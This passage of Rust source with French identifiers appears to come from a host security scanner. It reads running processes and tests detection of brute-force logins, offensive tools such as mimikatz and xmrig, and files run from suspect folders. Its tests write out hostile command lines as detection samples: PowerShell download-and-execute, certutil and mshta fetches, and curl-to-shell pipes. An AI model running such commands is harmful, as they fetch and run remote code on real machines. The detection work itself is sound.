                    chemin: texte("ExecutablePath"),
                    ligne: texte("CommandLine"),
                    sans_fichier: false,
                })
            })
            .collect(),
        _ => processus::liste()
            .into_iter()
            .map(|p| EnMarche {
                pid: p.pid,
                parent: Some(p.parent),
                nom: p.nom,
                ..EnMarche::default()
            })
            .collect(),
    };
    for p in &mut liste {
        if p.chemin.is_none() {
            p.chemin = processus::chemin(p.pid);
        }
        p.sans_fichier = p.chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists());
    }
    Some((liste, None))
}

/// Les programmes en marche d'après ps (le chemin du programme, puis la ligne de commande), comme les traces les
/// lisent.
#[cfg(target_os = "macos")]
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use std::process::Command;
    let ps = |format: &str| {
        crate::commande::lancer(Command::new("ps").args(["-axww", "-o", format]).env("LC_ALL", "C"), 20)
            .filter(|r| r.code == Some(0))
            .map(|r| r.sortie)
    };
    let liste = ps("pid=,ppid=,user=,lstart=,comm=")?;
    let lignes = ps("pid=,args=")
        .map(|s| crate::traces::lire_args(&s))
        .unwrap_or_default();
    let liste = crate::traces::lire_ps(&liste)
        .into_iter()
        .map(|(pid, parent, _, _, programme)| {
            let chemin = programme.starts_with('/').then(|| programme.clone());
            EnMarche {
                pid,
                parent,
                nom: nom_de_fichier(&programme).to_string(),
                sans_fichier: chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
                chemin,
                ligne: lignes.get(&pid).cloned(),
            }
        })
        .collect();
    Some((liste, None))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ip(texte: &str) -> IpAddr {
        texte.parse().unwrap()
    }

    fn echec(adresse: &str) -> Tentative {
        Tentative {
            adresse: ip(adresse),
            compte: String::new(),
            reussie: false,
        }
    }

    fn reussite(adresse: &str, compte: &str) -> Tentative {
        Tentative {
            adresse: ip(adresse),
            compte: compte.into(),
            reussie: true,
        }
    }

    /// Dix échecs puis une réussite depuis la même adresse : une intrusion. Neuf, une autre adresse, une réussite
    /// avant les échecs ou la machine elle-même : rien.
    #[test]
    fn mot_de_passe_devine() {
        let mut t: Vec<Tentative> = (0..SEUIL_ECHECS).map(|_| echec("203.0.113.7")).collect();
        t.push(reussite("203.0.113.7", "alice"));
        t.push(reussite("203.0.113.7", "alice"));
        assert_eq!(
            intrusions(&t),
            [Intrusion {
                adresse: ip("203.0.113.7"),
                compte: "alice".into(),
                echecs: SEUIL_ECHECS
            }]
        );
        // Neuf échecs seulement.
        assert_eq!(intrusions(&t[1..]), Vec::<Intrusion>::new());
        // La réussite vient d'une autre adresse que les échecs.
        let mut autre: Vec<Tentative> = (0..30).map(|_| echec("203.0.113.7")).collect();
        autre.push(reussite("192.0.2.4", "alice"));
        assert_eq!(intrusions(&autre), Vec::<Intrusion>::new());
        // La réussite d'abord, les échecs ensuite : quelqu'un d'autre a essayé après.
        let mut avant = vec![reussite("203.0.113.7", "alice")];
        avant.extend((0..30).map(|_| echec("203.0.113.7")));
        assert_eq!(intrusions(&avant), Vec::<Intrusion>::new());
        // La machine elle-même.
        let mut locale: Vec<Tentative> = (0..30).map(|_| echec("127.0.0.1")).collect();
        locale.push(reussite("127.0.0.1", "alice"));
        assert_eq!(intrusions(&locale), Vec::<Intrusion>::new());
    }

    #[test]
    fn constat_d_intrusion() {
        assert!(juger_intrusions(&[], Os::Linux).probleme.is_none());
        let internet = Intrusion {
            adresse: ip("203.0.113.7"),
            compte: "alice".into(),
            echecs: 42,
        };
        let c = juger_intrusions(std::slice::from_ref(&internet), Os::Linux);
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert!(c.verifie);
        assert!(
            c.message.contains("203.0.113.7") && c.message.contains("alice") && c.message.contains("42"),
            "{}",
            c.message
        );
        let k = c.correctif.unwrap();
        assert!(!k.automatique && k.action.contains("alice") && k.action.contains("PasswordAuthentication"));
        assert_eq!(k.commandes, ["vanguard traces"]);
        // Une adresse du réseau local : toujours critique, avec l'explication d'un appareil de la maison.
        let locale = Intrusion {
            adresse: ip("10.0.0.20"),
            compte: "alice".into(),
            echecs: 12,
        };
        let c = juger_intrusions(&[locale], Os::Windows);
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert!(
            c.message.contains(tr!("réseau local", "local network")),
            "{}",
            c.message
        );
        assert!(
            c.correctif
                .unwrap()
                .action
                .contains(tr!("Bureau à distance", "Remote Desktop"))
        );
        // Un nom de compte piégé ne pilote pas le terminal.
        let piege = Intrusion {
            adresse: ip("203.0.113.7"),
            compte: "x\x1b]52;c;eA==\x07".into(),
            echecs: 10,
        };
        let c = juger_intrusions(&[piege], Os::Linux);
        assert!(!c.message.contains('\x1b') && !c.correctif.unwrap().action.contains('\x1b'));
    }

    fn suspect(ligne: &str) -> Option<String> {
        commande_suspecte(ligne).map(|(_, e)| e)
    }

    /// Les formes d'une attaque dans une ligne de commande, coupées juste après le motif ; l'usage ordinaire des mêmes
    /// outils ne dit rien.
    #[test]
    fn lignes_de_commande_suspectes() {
        // PowerShell : commande cachée, texte exécuté, script téléchargé. Ce qui suit le motif n'est pas montré.
        let e =
            suspect(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgA").unwrap();
        assert_eq!(e, "powershell.exe -nop -w hidden -enc…");
        assert!(suspect("powershell -EncodedCommand SQBFAFgA").is_some());
        assert!(suspect("pwsh.exe /ec SQBFAFgA").is_some());
        let e = suspect(
            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1?jeton=s3cret')""#,
        )
        .unwrap();
        assert_eq!(e, "powershell -c \"IEX…");
        let e =
            suspect("powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/?k=s3cret')").unwrap();
        assert!(e.ends_with("DownloadString…") && !e.contains("s3cret"), "{e}");
        // Les autres outils de Windows détournés.
        assert_eq!(
            suspect("mshta.exe https://x.example/a.hta").unwrap(),
            "mshta.exe https:…"
        );
        assert!(suspect("mshta vbscript:Execute(\"x\")").is_some());
        assert!(suspect("certutil.exe -urlcache -split -f http://x.example/a.exe a.exe").is_some());
        assert!(suspect("certutil -decode a.txt a.exe").is_some());
        assert_eq!(
            suspect("regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll").unwrap(),
            "regsvr32 /s /n /u /i:http…"
        );
        assert!(suspect(r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ""#).is_some());
        assert!(suspect("bitsadmin /transfer job http://x.example/a.exe C:\\a.exe").is_some());
        // Linux et macOS : un script téléchargé ou décodé passé à un shell.
        let e = suspect("sh -c curl -fsSL https://x.example/i.sh?jeton=s3cret | sh").unwrap();
        assert_eq!(e, "sh -c curl…");
        assert!(suspect("bash -c wget -qO- http://x.example/a | /bin/bash").is_some());
        assert!(suspect("sh -c curl -s http://x.example/a | sudo -E bash").is_some());
        assert!(
            suspect("sh -c echo aGk= | base64 -d | sh")
                .unwrap()
                .ends_with("base64 -d…")
        );
        // Usages ordinaires : rien.
        for ligne in [
            "powershell.exe",
            r#""C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -File C:\Scripts\sauvegarde.ps1"#,
            r"powershell -ExecutionPolicy Bypass -File C:\Scripts\tiexport.ps1",
            "mshta.exe C:\\Program Files\\App\\aide.hta",
            "rundll32.exe printui.dll,PrintUIEntry",
            "certutil -hashfile a.iso SHA256",
            "curl -fsS https://x.example/a.json | jq .",
            "sh -c curl -s https://x.example || bash secours.sh",
            "base64 -d sauvegarde.b64",
            "/usr/bin/bash",
        ] {
            assert_eq!(suspect(ligne), None, "{ligne}");
        }
    }

    fn programme(pid: u32, nom: &str, chemin: Option<&str>, ligne: Option<&str>) -> EnMarche {
        EnMarche {
            pid,
            parent: Some(1),
            nom: nom.into(),
            chemin: chemin.map(str::to_string),
            ligne: ligne.map(str::to_string),
            sans_fichier: false,
        }
    }

    #[test]
    fn outils_offensifs() {
        let j = |p: &EnMarche| juger_programme(p, Os::Windows).map(|s| (s.niveau, s.raison));
        let mimi = programme(
            4242,
            "mimikatz.exe",
            Some(r"C:\Users\alice\Desktop\x\mimikatz.exe"),
            None,
        );
        assert_eq!(j(&mimi).map(|s| s.0), Some(Niveau::Eleve));
        assert!(
            j(&programme(
                7,
                "xmrig",
                Some("/home/alice/.cache/xmrig"),
                Some("./xmrig -o pool.example:3333")
            ))
            .is_some()
        );
        assert!(j(&programme(8, "SharpHound.exe", None, Some("SharpHound.exe -c All"))).is_some());
        assert!(j(&programme(9, "Rubeus.exe", None, None)).is_some());
        // Un script offensif lancé par un interpréteur se reconnaît à son nom.
        assert!(
            j(&programme(
                10,
                "python3",
                Some("/usr/bin/python3.12"),
                Some("python3 laZagne.py all")
            ))
            .is_some()
        );
        // Le chemin de l'interpréteur a des espaces, sans guillemets : son nom suffit à lire le script.
        let ps = r"C:\Program Files\PowerShell\7\pwsh.exe -File C:\Users\alice\Invoke-Mimikatz.ps1";
        assert!(j(&programme(14, "pwsh.exe", None, Some(ps))).is_some());
        // procdump seulement contre LSASS.
        assert!(
            j(&programme(
                11,
                "procdump64.exe",
                None,
                Some("procdump64.exe -ma lsass.exe l.dmp")
            ))
            .is_some()
        );
        assert!(
            j(&programme(
                12,
                "procdump.exe",
                None,
                Some("procdump.exe -ma 4242 jeu.dmp")
            ))
            .is_none()
        );
        // Un mot dans les arguments d'un programme ordinaire ne suffit pas.
        assert!(
            j(&programme(
                13,
                "grep",
                Some("/usr/bin/grep"),
                Some("grep -r mimikatz notes/")
            ))
            .is_none()
        );
    }

    #[test]
    fn dossiers_douteux() {
        let d = dossier_douteux;
        assert!(d(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe", Os::Windows).is_some());
        assert!(d(r"C:\Windows\Temp\a.exe", Os::Windows).is_some());
        assert!(d(r"C:\Users\alice\Downloads\setup.exe", Os::Windows).is_some());
        assert!(d(r"C:\Users\Public\update.exe", Os::Windows).is_some());
        assert!(d(r"C:\$Recycle.Bin\S-1-5-21-1\x.exe", Os::Windows).is_some());
        assert!(d(r"C:\Program Files\Mozilla Firefox\firefox.exe", Os::Windows).is_none());
        assert!(d(r"C:\Users\alice\AppData\Local\Discord\app-1.0\Discord.exe", Os::Windows).is_none());
        // Linux : Téléchargements et la corbeille ; /tmp reste à la règle des programmes sans fichier.
        assert!(d("/home/alice/Téléchargements/outil", Os::Linux).is_some());
        assert!(d("/home/alice/Downloads/outil", Os::Linux).is_some());
        assert!(d("/home/alice/.local/share/Trash/files/x", Os::Linux).is_some());
        assert!(d("/tmp/.x/agent", Os::Linux).is_none());
        assert!(d("/usr/bin/bash", Os::Linux).is_none());
        // macOS : /tmp, le dossier temporaire du compte, Partagé, la corbeille, une application pas encore déplacée.
        assert!(d("/private/tmp/x", Os::MacOs).is_some());
        assert!(d("/private/var/folders/ab/cdef123/T/x/agent", Os::MacOs).is_some());
        assert!(
            d(
                "/private/var/folders/ab/cdef123/X/com.google.Chrome.code_sign_clone/x/Google Chrome",
                Os::MacOs
            )
            .is_none()
        );
        assert_eq!(
            d(
                "/private/var/folders/ab/cdef123/T/AppTranslocation/1234/d/App.app/Contents/MacOS/App",
                Os::MacOs
            ),
            d("/Users/alice/Downloads/App.app/Contents/MacOS/App", Os::MacOs)
        );
        assert!(d("/Users/Shared/.x/agent", Os::MacOs).is_some());
        assert!(d("/Users/alice/.Trash/x", Os::MacOs).is_some());
        assert!(d("/Applications/Firefox.app/Contents/MacOS/firefox", Os::MacOs).is_none());
    }

    /// Un programme lancé d'un dossier douteux : moyen, élevé s'il a été effacé depuis ; son chemin est montré.
    #[test]
    fn programme_d_un_dossier_douteux() {
        let mut p = programme(
            4242,
            "setup.exe",
            Some(r"C:\Users\alice\Downloads\setup.exe"),
            Some("setup.exe /S"),
        );
        let s = juger_programme(&p, Os::Windows).unwrap();
        assert_eq!(s.niveau, Niveau::Moyen);
        assert_eq!(s.extrait.as_deref(), Some(r"C:\Users\alice\Downloads\setup.exe"));
        p.sans_fichier = true;
        assert_eq!(juger_programme(&p, Os::Windows).unwrap().niveau, Niveau::Eleve);
        // Un chemin très long garde sa fin : le programme.
        let long = format!("C:\\Users\\alice\\Downloads\\{}\\outil.exe", "d".repeat(80));
        let s = juger_programme(&programme(5, "outil.exe", Some(&long), None), Os::Windows).unwrap();
        let e = s.extrait.unwrap();
        assert!(
            e.starts_with('…') && e.ends_with("outil.exe") && e.chars().count() == LONGUEUR_EXTRAIT,
            "{e}"
        );
    }

    /// Vanguard, une autre copie de lui-même et tout ce qu'ils lancent sont écartés, petits-enfants compris.
    #[test]
    fn vanguard_jamais_montre() {
        let moi = r"C:\Outils\vanguard.exe";
        let mut liste = vec![
            EnMarche {
                pid: 100,
                parent: Some(4),
                nom: "vanguard.exe".into(),
                chemin: Some(moi.into()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 200,
                parent: Some(100),
                nom: "powershell.exe".into(),
                ligne: Some("powershell -NoProfile -Command IEX $x".into()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 300,
                parent: Some(200),
                nom: "conhost.exe".into(),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 400,
                parent: Some(4),
                nom: "vanguard.exe".into(),
                chemin: Some(moi.to_uppercase()),
                ..EnMarche::default()
            },
            EnMarche {
                pid: 500,
                parent: Some(4),
                nom: "powershell.exe".into(),
                ligne: Some("powershell -enc SQBFAFgA".into()),
                ..EnMarche::default()
            },
        ];
        let ecartes = de_vanguard(&liste, 100, Some(moi));
        assert!([100, 200, 300].iter().all(|p| ecartes.contains(p)));
        assert!(!ecartes.contains(&500));
        // La même casse de chemin vaut partout ; une autre casse ne vaut que sous Windows.
        assert_eq!(ecartes.contains(&400), cfg!(windows));
        let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(
            c[0].message.contains("PID 500") && !c[0].message.contains("PID 200"),
            "{}",
            c[0].message
        );
        assert!(!c[0].message.contains("SQBFAFgA"), "{}", c[0].message);
        // Rien de suspect : sain, en disant ce qui n'a pu être lu qu'en partie.
        liste.truncate(4);
        let c = juger_programmes(&liste, Os::Windows, &de_vanguard(&liste, 100, Some(moi)), Some("x."));
        assert_eq!(c.len(), 1);
        assert!(c[0].verifie && c[0].probleme.is_none());
        assert!(c[0].message.ends_with("x."), "{}", c[0].message);
    }

    /// Élevés et moyens dans deux constats, chacun à son niveau ; un nom piégé ne pilote pas le terminal.
    #[test]
    fn constats_des_programmes() {
        let mut piege = programme(77, "x\x1b]0;y\x07", Some("/home/alice/Downloads/x"), Some("./x"));
        piege.sans_fichier = false;
        let liste = vec![
            piege,
            programme(78, "xmrig", Some("/opt/x/xmrig"), Some("/opt/x/xmrig")),
            programme(79, "bash", Some("/usr/bin/bash"), Some("bash")),
        ];
        let c = juger_programmes(&liste, Os::Linux, &HashSet::new(), None);
        assert_eq!(c.len(), 2);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(c[0].message.contains("PID 78"), "{}", c[0].message);
        assert_eq!(c[1].probleme, Some(Niveau::Moyen));
        assert!(
            c[1].message.contains("PID 77") && !c[1].message.contains('\x1b'),
            "{}",
            c[1].message
        );
        assert!(c.iter().all(|c| c.correctif.as_ref().is_some_and(|k| !k.automatique)));
    }

    /// La vraie lecture de ce système : rien ne plante, Vanguard (ce test) n'est jamais montré. Aucun verdict : il
    /// dépend de ce qui tourne ici.
    #[test]
    fn lecture_reelle() {
        if let Some((liste, _)) = programmes_en_marche() {
            let moi = std::process::id();
            let ecartes = de_vanguard(&liste, moi, None);
            assert!(ecartes.contains(&moi));
            for c in juger_programmes(&liste, Os::actuel(), &ecartes, None) {
                assert!(!c.message.contains(&format!("(PID {moi})")), "{}", c.message);
            }
        }
        let _ = connexion_forcee();
    }
}
